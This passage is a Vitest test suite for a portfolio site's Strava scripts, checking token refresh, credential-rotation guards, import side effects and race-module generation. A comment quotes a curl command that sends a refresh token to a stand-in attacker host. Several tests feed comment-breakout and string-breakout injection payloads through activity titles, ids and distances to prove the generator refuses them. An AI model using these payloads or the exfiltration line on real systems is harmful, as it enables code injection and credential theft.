import {execFileSync} from "node:child_process";
import {readFileSync, readdirSync} from "node:fs";
import {pathToFileURL} from "node:url";

import {afterEach, describe, expect, it, vi} from "vitest";

import {
    orderSessions, renderWeek, toSession, weekKeysOfYear, yearWindow,
} from "../scripts/fetch-strava-weeks.mjs";
import {accessToken, canReachTheTruth} from "../scripts/strava-auth.mjs";
import {
    activityId, calendarDate, commentSafe, distinctIds, editOrderNote, hms, modulesOn,
    orderedByStart, raceSpanSeconds, recordingsFrom, renderModule, slugify, sportOf, titlesFrom,
} from "../scripts/scaffold-race.mjs";
/**
 * IMPORTED FOR ITS SIDE EFFECT OF BEING PARSED AND EVALUATED, which is the only static
 * analysis this file gets today beyond `eslint.config.js`'s `scripts/**` block. It exports
 * nothing this suite calls; a `ReferenceError` at its top level, a bad import specifier or a
 * syntax error fails collection here, where the whole suite is the message. Before the eslint
 * block and this line, `pnpm check`, `pnpm eslint` and `pnpm test` were all green over a
 * script nothing had read.
 */
import * as stravaSync from "../scripts/strava-sync.mjs";

/**
 * THE SCRIPTS UNDER `scripts/` THAT TALK TO STRAVA, held offline. Every script in that
 * directory does, so read the directory rather than a count here — this said three when it
 * was already four.
 *
 * WHY THEY NEED A SUITE AT ALL. `tests/strava-verify.test.ts` reaches the API and is opt-in,
 * so nothing in a default `pnpm test` used to execute a single line of the credential path or
 * of the arithmetic that turns activities into a race module. Both are unattended in effect:
 * the bot runs nightly with no human watching, and the scaffold's output is committed by a
 * person who is trusting it to have done the sums.
 *
 * THE ARITHMETIC HERE IS THREE RECORDED MISTAKES, each made more than once by hand before it
 * became code: `metres` copied verbatim rather than converted, a race's clock taken as the
 * span rather than the sum, and recordings ordered by when they were ridden rather than by
 * the order the ids were pasted. Each has an assertion below that fails if the code reverts
 * to the mistake.
 *
 * THE NETWORK IS STUBBED, NEVER REACHED. `accessToken` is the one function in the repository
 * that can WRITE a credential, so the branch that decides whether it may is exercised here
 * with a fake `fetch` — the alternative is that the rotation path is first executed on the
 * day a rotation actually happens.
 */

afterEach(() => {
    vi.unstubAllGlobals();
});

/**
 * EVERY SCRIPT, AT ANY DEPTH. `readdirSync("scripts")` without `recursive` returns the top level
 * only, so a helper in a SUBDIRECTORY of it would be linted by `pnpm eslint` — whose glob
 * reaches every depth — and probed by nothing here, under two docblocks claiming directory
 * discovery. Measured: a nested module that overwrites `globalThis.fetch` passed both gates
 * before this helper existed. `tests/build-output.test.ts` already uses this form over its own
 * directory and `src` for the same reason.
 */
const scriptFiles = (): string[] =>
    (readdirSync("scripts", {recursive: true, encoding: "utf8"}) as string[])
        .filter((f) => f.endsWith(".mjs"));

describe("the shared Strava credential path", () => {
    /**
     * READ WHEN CALLED, NEVER AT IMPORT — and this assertion is what holds it, because the
     * failure it prevents is silent from here. `tests/projection.test.ts` imports
     * `scripts/fetch-strava-progress.mjs` for `nextProgress`, and that script imports
     * `scripts/strava-auth.mjs`. A top-level `const ID = process.env.STRAVA_CLIENT_ID` in the
     * auth module would therefore throw during COLLECTION of a suite that has nothing to do
     * with credentials, on every machine that does not happen to have Strava secrets in its
     * environment — which is every machine that runs the suite.
     *
     * MEASURED: a hoisted read makes this FILE fail to collect rather than making a case go
     * red, which is a redder red and a less legible one — so the second half below is what
     * actually discriminates. Two calls, two different environments, and the request body has
     * to follow the argument. A module-level capture would send the first environment twice,
     * or the process's, and would pass every "it throws when a variable is missing" assertion
     * ever written.
     */
    // The parameters are declared even though the fake ignores them: `mock.calls` takes its
    // element type from the function's signature, so a zero-argument fake makes every call
    // record an empty tuple and the request body below unreadable.
    const tokenResponse = (body: unknown) => vi.fn(async (_url: string, _init: RequestInit) => ({
        ok: true,
        status: 200,
        json: async () => body,
        text: async () => JSON.stringify(body),
    }));

    it("reads the environment when it is called, and names the variable it wants", async () => {
        await expect(accessToken({})).rejects.toThrow("Missing env: STRAVA_REFRESH_TOKEN");
        await expect(accessToken({STRAVA_REFRESH_TOKEN: "r"})).rejects.toThrow("Missing env: STRAVA_CLIENT_ID");

        const fetched = tokenResponse({access_token: "at", refresh_token: "r"});
        vi.stubGlobal("fetch", fetched);
        for (const id of ["first", "second"]) {
            await accessToken({STRAVA_CLIENT_ID: id, STRAVA_CLIENT_SECRET: "s", STRAVA_REFRESH_TOKEN: "r"});
        }
        const sent = fetched.mock.calls.map(([, init]) => JSON.parse(init.body as string).client_id);
        expect(sent, "the request must carry the environment it was CALLED with, both times")
            .toEqual(["first", "second"]);
    });

    const ENV = {
        STRAVA_CLIENT_ID: "id", STRAVA_CLIENT_SECRET: "secret", STRAVA_REFRESH_TOKEN: "the-same-one",
    };

    it("returns the access token and persists nothing when the refresh token is unchanged", async () => {
        // The ordinary case, and the one that runs every night: Strava echoes the refresh
        // token it was given. Nothing may be written on this path — a `gh secret set` here
        // would fire nightly.
        vi.stubGlobal("fetch", tokenResponse({access_token: "at", refresh_token: "the-same-one"}));
        await expect(accessToken(ENV)).resolves.toBe("at");
    });

    /**
     * THE WHOLE REQUEST, NOT ONE FIELD OF IT. Every assertion above reads `client_id` and
     * nothing else, and six mutations survived that: a wrong URL, `GET` instead of `POST`, a
     * dropped `Content-Type`, `client_secret` sourced from the refresh token, a missing
     * `grant_type`, and a fifth field smuggled into the body.
     *
     * `toEqual` ON THE PARSED BODY is what closes the last two at once — an extra key fails an
     * equality where it passes any number of `toContain`s. THIS REPOSITORY IS PUBLIC and its
     * Actions logs are world-readable, so a body that quietly grew a field, or a URL quietly
     * pointed somewhere else, is a live credential published to strangers with nothing red.
     *
     * The URL is written out rather than compared to the script's own constant: `TOKEN_URL` is
     * not exported, and importing it would make this assert that the code equals itself.
     * `new Headers()` because a header name is case-insensitive and the raw object is not —
     * pinning the literal `"Content-Type"` would redden on a correct `content-type`.
     */
    it("posts the refresh to Strava's token endpoint, with exactly the four fields it needs", async () => {
        const fetched = tokenResponse({access_token: "at", refresh_token: "the-same-one"});
        vi.stubGlobal("fetch", fetched);
        await accessToken(ENV);

        expect(fetched.mock.calls).toHaveLength(1);
        const [url, init] = fetched.mock.calls[0];
        expect(url, "a token refresh may go to exactly one place").toBe("https://www.strava.com/oauth/token");
        expect(init.method).toBe("POST");
        expect(new Headers(init.headers).get("content-type")).toBe("application/json");
        expect(JSON.parse(init.body as string), "an extra field here is a credential leaving the process")
            .toEqual({
                client_id: "id",
                client_secret: "secret",
                refresh_token: "the-same-one",
                grant_type: "refresh_token",
            });
    });

    /**
     * A SENTINEL, AND ITS LIMITS ARE THE POINT. `console.log` is where a debugging line goes,
     * and in this repository that line lands in a PUBLIC Actions log: `strava-progress.yml`
     * runs the bot nightly and anyone can read the output. So one assertion holds that the
     * ordinary refresh prints nothing at all.
     *
     * WHAT IT DOES NOT CATCH, written out so it is not mistaken for a guarantee:
     * `process.stdout.write` bypasses `console` entirely; `console.error` is a different
     * method and is not spied here; and a credential interpolated into a thrown `Error` is
     * printed by the runner rather than by this process. This closes the likeliest hole, not
     * the class.
     *
     * The rotation path deliberately DOES log — one line saying which stores it wrote — and
     * that line carries no value. It is out of this case's reach because nothing rotates here.
     */
    it("prints nothing on the path that runs every night", async () => {
        vi.stubGlobal("fetch", tokenResponse({access_token: "at", refresh_token: "the-same-one"}));
        const logged = vi.spyOn(console, "log").mockImplementation(() => {});
        try {
            await accessToken(ENV);
            expect(logged.mock.calls, "an ordinary refresh must print nothing: this process holds a live "
                + "credential and its stdout is a world-readable Actions log").toEqual([]);
        } finally {
            logged.mockRestore();
        }
    });

    /**
     * THE REACHABILITY PROBE, THROUGH ITS INJECTED SEAM. `canReachTheTruth` decides whether a
     * rotation may be persisted, and until it took a `run` argument the only way to exercise
     * it was to have — or not have — the 1Password CLI on the machine running the suite.
     *
     * THE THIRD ROW IS THE ONE THAT MATTERS. `op --version` succeeds while signed OUT and
     * while the vault is LOCKED, so a `status: 0` here means "there is a CLI to try" and never
     * "a write will land". That is deliberate: `op whoami` is the obvious stronger probe and
     * was measured non-zero in this machine's ordinary working state — no CLI session has ever
     * existed, every read authenticates through the desktop app — so gating on it would refuse
     * a write that would have succeeded and turn a three-second unlock into the unrecoverable
     * case. A locked vault is meant to be discovered by attempting the write.
     */
    it("asks whether the CLI is installed, and refuses CI whatever the answer", () => {
        // Cast through `unknown` because the seam's parameter is the REAL `spawnSync`, whose
        // type is a five-way overload set no two-line fake can satisfy structurally. The seam
        // reads one property of the result, and that is what the fakes provide.
        type SpawnSync = typeof import("node:child_process").spawnSync;
        const probe = (status: number) => ((() => ({status})) as unknown) as SpawnSync;
        expect(canReachTheTruth({}, probe(0))).toBe(true);
        expect(canReachTheTruth({}, probe(127)), "no `op` on PATH — there is nothing to try").toBe(false);
        expect(canReachTheTruth({GITHUB_ACTIONS: "true"}, probe(0)),
            "a runner that installed the CLI still may not write a credential unattended").toBe(false);
    });

    it("loads scripts/strava-sync.mjs, which nothing else in the suite executes", () => {
        // The smoke import at the head of this file is the assertion; this names it so the
        // import is not read as unused and deleted. See the note there.
        expect(typeof stravaSync).toBe("object");
    });

    /**
     * THE ROTATION, ON THE SIDE THAT CANNOT PERSIST IT. In GitHub Actions there is no
     * 1Password, so a rotated token is unrecoverable in BOTH stores at once — the copy is
     * spent and so is the truth. The old inline refresh destructured `access_token` alone and
     * so could not have noticed; this asserts that the successor both notices and refuses,
     * rather than writing half a rotation from a context nobody watches.
     *
     * `GITHUB_ACTIONS` is what makes this deterministic offline: the local branch shells out
     * to `op`, which a test must not do.
     */
    it("REFUSES a rotation it cannot persist, rather than half-writing it", async () => {
        vi.stubGlobal("fetch", tokenResponse({access_token: "at", refresh_token: "a-new-one"}));
        await expect(accessToken({...ENV, GITHUB_ACTIONS: "true"}))
            .rejects.toThrow(/rotated the refresh token and this process cannot reach 1Password/);
    });

    it("fails loudly on a refused refresh rather than returning undefined", async () => {
        vi.stubGlobal("fetch", vi.fn(async () => ({
            ok: false, status: 400, text: async () => "Bad Request", json: async () => ({}),
        })));
        await expect(accessToken(ENV)).rejects.toThrow("Token refresh failed: 400");
    });

    it("treats a 200 with no access_token as a failure", async () => {
        // Not hypothetical in shape: an OAuth endpoint answering 200 with an error body is a
        // documented way for a token endpoint to misbehave, and `const {access_token} = …`
        // would hand `undefined` to an Authorization header and 401 somewhere far away.
        vi.stubGlobal("fetch", tokenResponse({message: "Authorization Error"}));
        await expect(accessToken(ENV)).rejects.toThrow("no access_token");
    });

    /**
     * A DROPPED ROTATION USED TO BE INDISTINGUISHABLE FROM AN ORDINARY NIGHT.
     *
     * The guard was one expression — `typeof body.refresh_token === "string" && body.refresh_token
     * !== refreshToken` — so a response that omitted the field, or returned it as a number or an
     * object, simply failed the condition and the function RETURNED THE ACCESS TOKEN. It failed
     * closed on writing and open on returning success, which is the worst pairing available: if
     * Strava had in fact rotated, both stores were left holding a spent credential and nothing
     * was thrown, logged, or otherwise noticed until the bot failed at 05:13 some later night
     * with a message about a bad refresh token and no clue where it came from.
     *
     * THE THREE SHAPES ARE ASSERTED SEPARATELY because they fail the old guard for two different
     * reasons and a `toThrow` on one of them says nothing about the others. `access_token` is
     * refused the same way four lines up in the module; this is that treatment applied to the
     * quieter half.
     */
    it("treats a 200 with no usable refresh_token as a failure, rather than dropping a rotation", async () => {
        // THE EMPTY STRING IS THE ONE A `typeof` TEST ALONE GETS WRONG, and it fails in the
        // opposite direction: `""` is a string that can never equal the token the request
        // carried, so the comparison in the module reads it as A ROTATION and writes it to both
        // stores. A review panel found this; the first version of this loop tested only the
        // three shapes above and was green over it.
        for (const returned of [
            {}, {refresh_token: 1234}, {refresh_token: {value: "r"}},
            {refresh_token: ""}, {refresh_token: "   "}, {refresh_token: "\n"}, {refresh_token: null},
        ]) {
            vi.stubGlobal("fetch", tokenResponse({access_token: "at", ...returned}));
            await expect(accessToken(ENV), `${JSON.stringify(returned)} was accepted`)
                .rejects.toThrow(/no usable refresh_token/);
        }
    });

    /**
     * WHERE THE CREDENTIAL COPY GOES, PINNED — because it is the one value in `.env.op` that is
     * not an address of something to READ.
     *
     * That file's header frames its contents as "REFERENCES, NOT VALUES", and for the `op://`
     * lines that is exactly right: an address is not a secret. `STRAVA_SECRET_REPO` is different
     * in kind. It is the `-R` argument of `gh secret set STRAVA_REFRESH_TOKEN`, so it names the
     * DESTINATION OF A CREDENTIAL WRITE, and a wrong value here hands this repository's Strava
     * token to whatever repository the string points at.
     *
     * IT IS NOT A FINDING and this assertion does not pretend otherwise: `gh secret set` needs
     * the authenticated account to hold admin on the target, and anyone who can land an edit to
     * `.env.op` can land `curl attacker/$STRAVA_REFRESH_TOKEN` beside it. What it buys is that
     * the value cannot drift by accident — a rename, a fork, a copy-paste from another project —
     * for three lines.
     *
     * THE WRITERS ARE DISCOVERED, NOT LISTED. A third script that learns to write this secret is
     * found by the capability it uses rather than by being remembered here, which is the same
     * rule `tests/dns-config.test.ts` applies to jobs that can write DNS.
     */
    it("pins the repository a credential is copied to, on every path that copies one", () => {
        // MATCHED, NOT PARSED. The first version hand-rolled a dotenv reader — a line filter
        // plus a quote strip — which is a RE-IMPLEMENTATION of `op run --env-file`, and it
        // reddens on spellings that tool accepts and the scripts read correctly: an `export`
        // prefix, single quotes, a trailing comment. The scripts read `env.STRAVA_SECRET_REPO`
        // out of a process environment `op run` has already populated, so no offline assertion
        // can literally "read it the way the scripts read it"; the honest goal is a predicate
        // that no correct spelling can redden.
        expect(readFileSync(".env.op", "utf8"),
            "the destination of a credential write is not this repository")
            .toMatch(/^(?:export\s+)?STRAVA_SECRET_REPO=["']?calvindotsg\/portfolio-v2["']?\s*(?:#.*)?$/m);

        const writers = scriptFiles()
            .filter((f) => /\bsecret\b[\s\S]{0,40}?\bset\b/.test(readFileSync(`scripts/${f}`, "utf8")));
        expect(writers.length, "no script writes a GitHub secret, so this case is vacuous")
            .toBeGreaterThan(0);
        for (const file of writers) {
            const source = readFileSync(`scripts/${file}`, "utf8");
            expect(source, `${file} writes a secret without reading STRAVA_SECRET_REPO for its -R`)
                .toMatch(/required\(env,\s*"STRAVA_SECRET_REPO"\)/);
        }
    });
});

/**
 * IMPORTING A SCRIPT MUST CHANGE NOTHING OUTSIDE IT — the property `commentSafe` and
 * `activityId` hold for GENERATED modules, asked of the scripts that generate them.
 *
 * THIS IS NOT HYPOTHETICAL AND NOTHING ELSE CAUGHT IT. While plan 031 was being executed, a
 * docblock added to `scripts/scaffold-race.mjs` quoted the JSDoc-breakout payload PLAINLY. That
 * closed the comment it was written inside, and the words after it — `globalThis.P3=1;` —
 * stopped being prose and became a TOP-LEVEL STATEMENT in the script. The text that followed
 * reopened a comment, so the delimiters balanced and the file still parsed. MEASURED:
 * `node --check` passed, `pnpm check` reported 0 errors, `pnpm eslint` was silent, and the whole
 * suite was green, while importing the module set a global. The defect this plan exists to close,
 * committed into the fix for it.
 *
 * THE PROBE RUNS IN A FRESH NODE PROCESS, AND THAT IS THE LOAD-BEARING PART. The obvious version
 * — snapshot `globalThis`, `await import()`, diff — was written first and was GREEN ON THE LIVE
 * DEFECT: this file imports two of these scripts at its own top, so by the time any case runs the
 * global has ALREADY been set and appears in the "before" snapshot. A cache-busting query does
 * not help, because the pollution predates the case rather than the import. Only a scope that
 * never loaded these modules can answer the question, and a child process is the cheapest one.
 *
 * WHAT IS ACTUALLY CHECKED, listed rather than summarised, because the first version of this
 * docblock claimed "changes nothing outside it" while the probe compared only NEWLY ADDED global
 * keys — so a review panel showed that overwriting `globalThis.fetch`, writing `process.env` or
 * patching `Array.prototype` all passed it. Three snapshots now: the own enumerable keys of
 * `globalThis`, the keys of `process.env`, and the identity of a handful of globals that an
 * exfiltration or a monkey-patch would have to replace. It is still not a proof of "no side
 * effects" — nothing cheap is — but each thing it names, it holds.
 *
 * THE CHILD PRINTS A SENTINEL and the parent refuses anything before it. A script that writes to
 * stdout at import time would otherwise make `JSON.parse` throw a bare `SyntaxError` naming no
 * file; import-time output is itself a side effect worth failing on, in a repository whose
 * Actions logs are world-readable.
 *
 * Every script guards its own `main` on `process.argv[1]`, which `-e` leaves undefined, so a
 * probe imports the module without running the program. DISCOVERED FROM THE DIRECTORY at any
 * depth (see `scriptFiles`): a script added tomorrow is covered the day it lands.
 */
describe("the scripts themselves", () => {
    it("has no script whose import changes the world around it", () => {
        const scripts = scriptFiles();
        expect(scripts.length, "no scripts were found, so this case is vacuous").toBeGreaterThan(0);
        for (const file of scripts) {
            const url = pathToFileURL(`scripts/${file}`).href;
            const probe = [
                "const keysBefore = new Set(Object.keys(globalThis));",
                "const envBefore = new Set(Object.keys(process.env));",
                "const pinned = {fetch: globalThis.fetch, consoleLog: console.log,",
                "  arrayAt: Array.prototype.at, jsonParse: JSON.parse, objectKeys: Object.keys};",
                `await import(${JSON.stringify(url)});`,
                "const now = {fetch: globalThis.fetch, consoleLog: console.log,",
                "  arrayAt: Array.prototype.at, jsonParse: JSON.parse, objectKeys: Object.keys};",
                "process.stdout.write('__PROBE__' + JSON.stringify({",
                "  addedGlobals: Object.keys(globalThis).filter((k) => !keysBefore.has(k)),",
                "  addedEnv: Object.keys(process.env).filter((k) => !envBefore.has(k)),",
                "  replaced: Object.keys(pinned).filter((k) => pinned[k] !== now[k]),",
                "}));",
            ].join("\n");
            const raw = execFileSync(process.execPath, ["--input-type=module", "-e", probe], {encoding: "utf8"});
            const at = raw.indexOf("__PROBE__");
            expect(at, `scripts/${file} produced no probe result. It printed: ${raw.slice(0, 200)}`)
                .toBeGreaterThanOrEqual(0);
            expect(raw.slice(0, at), `scripts/${file} wrote to stdout while being imported`).toBe("");
            const report = JSON.parse(raw.slice(at + "__PROBE__".length)) as {
                addedGlobals: string[]; addedEnv: string[]; replaced: string[];
            };
            expect(report, `importing scripts/${file} changed something outside it. A comment that `
                + "closes early puts the words after it at top level, and every other gate here "
                + "reads that as prose.")
                .toEqual({addedGlobals: [], addedEnv: [], replaced: []});
        }
    });
});

describe("the race scaffold's arithmetic", () => {
    /**
     * THE 2024 ROUND-ISLAND RIDE, WHICH IS THE CASE THE WHOLE FUNCTION EXISTS FOR.
     *
     * The bike broke at Lim Chu Kang and was repaired, so the race is two activities with
     * 2:43:19 of workshop between them. Its parts hold 1:28:41 + 5:53:34 = 7:22:15 of
     * recording; the race's own clock is 10:05:34, because elapsed already contains stops and
     * the race's span is defined by its two ENDS rather than by what was recorded between
     * them. The figures are the ones in
     * `src/data/races/2024-08-04-pesta-sukan-round-island-bike-adventure.ts`, so this holds
     * the scaffold to the module a human wrote by hand and checked.
     *
     * SUMMING IS THE MUTATION THIS RULES OUT, and it is not a distant one — it is what a
     * reader reaches for, and 7:22:15 looks perfectly plausible on a bib.
     */
    const ROUND_ISLAND = [
        {id: "12058884605", start_date: "2024-08-04T00:11:00Z", elapsed_time: 5321, distance: 17908.4, name: "Part one"},
        {id: "12058885236", start_date: "2024-08-04T04:23:00Z", elapsed_time: 21214, distance: 117411.0, name: "Part two"},
    ];

    it("takes a split race's clock from first start to last stop, not from the sum of its parts", () => {
        expect(hms(raceSpanSeconds(ROUND_ISLAND))).toBe("10:05:34");
        const summed = ROUND_ISLAND.reduce((total, a) => total + a.elapsed_time, 0);
        expect(hms(summed), "the sum is the wrong answer, and this is what it looks like").toBe("7:22:15");
        expect(raceSpanSeconds(ROUND_ISLAND)).toBeGreaterThan(summed);
    });

    it("is the activity's own elapsed time when a race is one activity", () => {
        expect(hms(raceSpanSeconds([ROUND_ISLAND[0]]))).toBe("1:28:41");
    });

    it("cannot be shortened by an activity contained inside another", () => {
        // A duplicate upload sits wholly inside the ride it duplicates. `last.start +
        // last.elapsed` would take the span from THAT activity's end and lose the real one.
        const contained = {id: "9", start_date: "2024-08-04T04:30:00Z", elapsed_time: 60, distance: 1000, name: "Dup"};
        expect(hms(raceSpanSeconds([...ROUND_ISLAND, contained]))).toBe("10:05:34");
    });

    it("orders recordings by when they were ridden, not by the order the ids were typed", () => {
        const reversed = [ROUND_ISLAND[1], ROUND_ISLAND[0]];
        expect(orderedByStart(reversed).map((a) => a.id)).toEqual(["12058884605", "12058885236"]);
    });

    it("pads minutes and seconds and leaves hours bare, which is the shape every clock is held to", () => {
        // The data contract holds every clock on a bib to /^\d{1,2}:[0-5]\d:[0-5]\d$/, so a
        // bare `9:5:3` or a zero-padded `09:05:03` would land as a module the suite rejects.
        for (const seconds of [0, 3, 63, 3661, 36303]) {
            expect(hms(seconds)).toMatch(/^\d{1,2}:[0-5]\d:[0-5]\d$/);
        }
        expect(hms(36303)).toBe("10:05:03");
        expect(hms(0)).toBe("0:00:00");
    });
});

describe("the race scaffold's output", () => {
    const rendered = renderModule({
        date: "2024-08-04",
        sport: "cycling",
        elapsed_time: "10:05:34",
        recordings: [{id: "12058884605", metres: 17908.4, elapsed_time: "1:28:41"}],
        titles: [{id: "12058884605", title: "Morning Ride"}],
        argv: ["12058884605"],
    });

    /**
     * MISSING, NOT STUBBED. The scaffold's whole value is that `pnpm check` becomes the
     * checklist: a module without `name` and `country` does not compile, and the compiler
     * names the file. A placeholder — `name: "TODO"` — compiles, and a compiling module is one
     * that can be committed and shipped.
     *
     * `outcome` is the sharpest of the five, and it is why the scaffold can never be a
     * generator: no source has a DNF, so a race the API describes perfectly may still be a
     * race that was abandoned.
     */
    it("leaves every field the API cannot know absent, so the compiler asks for them", () => {
        // THE CODE, NOT THE WHOLE FILE. The comment above the object names `outcome` on
        // purpose — a DNF is the one fact no source has, so the scaffold has to say so in
        // words — and a grep over the file would read that prose as a written field.
        const code = rendered.split("export default")[1];
        expect(code, "the scaffold emitted no object at all").toBeDefined();
        // THE KEY SET, NOT A DENY-LIST OF FIVE NAMES. This used to check that five specific
        // strings were absent, which says nothing about a SIXTH: emitting `end_date` was
        // demonstrated green through a full build, and `end_date` is a field that changes how
        // a race books — a tour pro-rates across its span. The repository's doctrine everywhere
        // else is discover-don't-enumerate, so the object is parsed and its keys compared as a
        // set. Anything the API cannot know is then absent by construction rather than by
        // having been thought of.
        //
        // Evaluated rather than regex'd because the emitted text is a TypeScript object literal
        // with unquoted keys, which is not JSON — and because the nested rows have to be read
        // the same way. The input is this repository's own generator output.
        const literal = code.split("satisfies RaceEvent")[0];
        const emitted = new Function(`return (${literal})`)() as Record<string, unknown>;
        expect(new Set(Object.keys(emitted)),
            "the scaffold emitted a field the API does not know. Everything absent here is absent "
            + "so that `pnpm check` names it: a placeholder compiles, and a module that compiles "
            + "is one that ships.")
            .toEqual(new Set(["date", "sport", "elapsed_time", "recordings"]));
        // AND EVERY ROW, which a top-level-only comparison misses entirely: an `official:` block
        // written inside a recording row leaves the key set above untouched.
        const rows = emitted.recordings as Record<string, unknown>[];
        expect(rows.length, "no recording row was emitted, so the loop below is vacuous").toBeGreaterThan(0);
        for (const row of rows) {
            expect(new Set(Object.keys(row)), `recording ${String(row.id)} carries a field the API does not know`)
                .toEqual(new Set(["id", "metres", "elapsed_time"]));
        }
        expect(code).toContain("satisfies RaceEvent");
        expect(emitted.date).toBe("2024-08-04");
    });

    /**
     * ASKED OF `recordingsFrom`, NOT OF THE RENDERED TEXT, and the difference was measured
     * rather than reasoned. This assertion first read the string `renderModule` returns for
     * rows the test itself had built — so it was asserting that the test's own fixture said
     * what the test's own fixture said. MUTATION: replacing the copy in the scaffold with a
     * helpful `Math.floor(distance / 10) / 100` left all 17 cases green. The conversion lives
     * one function up from the renderer, so the question has to be asked one function up.
     *
     * The API's `distance` is 17908.4 metres. A row storing 17.90 is a figure `raceKm` would
     * then convert a second time, and the raw number could never be recovered — which is what
     * `Recording.metres` exists to make impossible.
     */
    it("copies `metres` verbatim rather than converting it", () => {
        const rows = recordingsFrom([
            {id: 12058884605, start_date: "2024-08-04T00:11:00Z", elapsed_time: 5321, distance: 17908.4},
            {id: 12058885236, start_date: "2024-08-04T04:23:00Z", elapsed_time: 21214, distance: 117411.0},
        ]);
        expect(rows.map((r) => r.metres)).toEqual([17908.4, 117411.0]);
        expect(rows.map((r) => r.id), "an id is a STRING — a 19-digit one would round as a number")
            .toEqual(["12058884605", "12058885236"]);
        expect(rows.map((r) => r.elapsed_time)).toEqual(["1:28:41", "5:53:34"]);
        // And the rendered module carries them unchanged, which is the other half of the
        // journey the old single assertion was standing in for.
        expect(rendered).toContain("metres: 17908.4");
    });

    it("keeps the activity title as evidence and never as the race's name", () => {
        // "Morning Ride" is what the rider typed at the time. It belongs in the comment that
        // justifies the id, and nowhere the site could render it.
        const [comment, code] = rendered.split("export default");
        expect(comment).toContain("Morning Ride");
        expect(code).not.toContain("Morning Ride");
    });

    it("refuses a sport that joins no goal instead of guessing one", () => {
        expect(() => sportOf({id: 1, sport_type: "AlpineSki"})).toThrow(/maps to no sport/);
        expect(sportOf({id: 1, sport_type: "VirtualRide"})).toBe("cycling");
        // `type` is the older field and is still what some responses carry.
        expect(sportOf({id: 1, type: "Run"})).toBe("running");
    });

    it("makes a filename stem out of a title without letting it become the race's name", () => {
        expect(slugify("OCBC Cycle — Johor Bahru!")).toBe("ocbc-cycle-johor-bahru");
        expect(slugify("")).toBe("rename-me");
        expect(slugify(undefined)).toBe("rename-me");
    });

    /**
     * A TITLE CANNOT CLOSE THE COMMENT IT IS QUOTED IN.
     *
     * An activity title is text from an API, and it goes into the module's JSDoc block as
     * evidence for the ids. A title carrying the two characters that END a block comment closes
     * it early, and everything after lands as TOP-LEVEL EXECUTABLE CODE in a file that is about
     * to be committed — `pnpm check` reads it as ordinary source and says nothing.
     *
     * `JSON.stringify` alone does not close this and that is the whole trap: no JSON escape
     * produces a `/`, so the sequence passes through untouched. The assertion is therefore on
     * the RENDERED MODULE rather than on the helper — a hostile title has to be unable to reach
     * executable position, wherever the escaping happens to live.
     */
    it("cannot be made to write executable code out of an activity title", () => {
        const hostile = '*/ globalThis.OWNED = 1; /*';
        const module = renderModule({
            date: "2024-08-04", sport: "cycling", elapsed_time: "1:00:00",
            recordings: [{id: "1", metres: 1000, elapsed_time: "1:00:00"}],
            titles: [{id: "1", title: hostile}],
            argv: ["1"],
        });
        const [comment, code] = module.split("export default");
        expect(comment, "the title escaped its comment and reached module scope").not.toContain("*/ globalThis");
        expect(code, "nothing from a title may appear outside the comment").not.toContain("globalThis");
        // The comment still ENDS, exactly once, where the generator put it.
        expect(comment.split("*/")).toHaveLength(2);
        // And the title is preserved rather than mangled: `\/` is JSON's own spelling of `/`.
        expect(JSON.parse(commentSafe(hostile))).toBe(hostile);
    });

    /**
     * NEITHER FIELD THE SCAFFOLD COPIES RAW MAY CARRY CODE, and there are exactly two of them.
     *
     * The case above proves it of the activity TITLE, which `commentSafe` escapes. `metres` and
     * `id` had no such defence: `metres` is emitted UNQUOTED, so a string value lands as an
     * expression, and `id` is emitted inside a double-quoted literal AND again raw into the JSDoc
     * block — three sinks between two fields. The generated module is loaded by
     * `src/data/races/index.ts` with `import.meta.glob(..., {eager: true})`, so whatever reaches
     * executable position there RUNS AT EVERY BUILD.
     *
     * MEASURED AGAINST UNFIXED CODE, not reasoned: each payload below was rendered, written to
     * disk and imported, and each set its own global. The first is the nastiest of the three
     * because it is INVISIBLE DOWNSTREAM — `metres: (globalThis.PWNED = 1, 17908.4)` evaluates to
     * 17908.4, so `tests/data-contract.test.ts` reads a perfectly ordinary race.
     *
     * THE MIRROR CALLS `main`'s OWN TWO FUNCTIONS. `main` does I/O and a network call, so it
     * cannot be invoked here — but `recordingsFrom` and `titlesFrom` are the whole of what it
     * does with an activity, and a mirror that RE-IMPLEMENTED either would be asserting about
     * itself. `titlesFrom` exists for this: the evidence line used to be a line inside `main`
     * that nothing could reach, which is how an id got into a JSDoc block unchecked.
     *
     * A FOURTH PAYLOAD, `], EVIL, [`, IS DELIBERATELY ABSENT. It carries no quote character, so
     * it cannot leave the string literal it is emitted into; it appeared in an audit draft and is
     * not an injection. Asserting on it would assert that harmless text is harmless.
     */
    describe("cannot be made to write executable code out of an activity id or distance", () => {
        const BASE = {
            id: 12058884605, start_date: "2024-08-04T00:11:00Z", elapsed_time: 5321,
            distance: 17908.4, name: "Morning Ride",
        };
        // `main`'s own two steps with an activity, in `main`'s own order.
        const scaffolded = (activity: Record<string, unknown>) => renderModule({
            date: "2024-08-04", sport: "cycling", elapsed_time: "1:28:41",
            recordings: recordingsFrom([activity]),
            titles: titlesFrom([activity]),
            argv: [String(activity.id)],
        });

        const PAYLOADS = [
            {
                what: "a `distance` that is an expression rather than a number",
                activity: {...BASE, distance: "(globalThis.PWNED = 1, 17908.4)"},
                injected: "globalThis.PWNED",
            },
            {
                what: "an `id` that closes the recording row's string literal",
                activity: {...BASE, id: '1", metres: (globalThis.INJECTED_ROW = 1, 5), z: "'},
                injected: "globalThis.INJECTED_ROW",
            },
            {
                what: "an `id` that closes the module's JSDoc block",
                activity: {...BASE, id: "1*/ globalThis.INJECTED_DOC = 1; /*"},
                injected: "globalThis.INJECTED_DOC",
            },
        ];

        for (const {what, activity, injected} of PAYLOADS) {
            it(`refuses ${what}`, () => {
                // REFUSED, NOT ESCAPED. A coerced or stripped value is a race that ships wrong
                // figures quietly, which is worse than a scaffold that stops and says why.
                //
                // THE THROW IS TYPED. A bare `toThrow()` passes on ANY error, including a
                // `TypeError` from a future refactor that never reached the guard at all, so
                // the message has to name which guard refused. A second assertion used to sit
                // here re-rendering and checking the text was absent; it could only ever see
                // the empty string, because it ran after the throw had already been asserted.
                expect(() => scaffolded(activity),
                    `${injected} reached the generated module instead of being refused`)
                    .toThrow(/not a decimal Strava id|is not a length in metres/);
            });
        }
    });

    /**
     * THE DISTANCE SEAM, AND THE COERCIONS THAT LOOK LIKE VALIDATION.
     *
     * The first version of this guard read `Number(activity.distance)` and checked the RESULT,
     * which is a coercion wearing a validation. A review panel measured what it let through:
     * `null`, `""`, `[]` and `false` all became 0 metres, `true` became 1, `"0x10"` became 16,
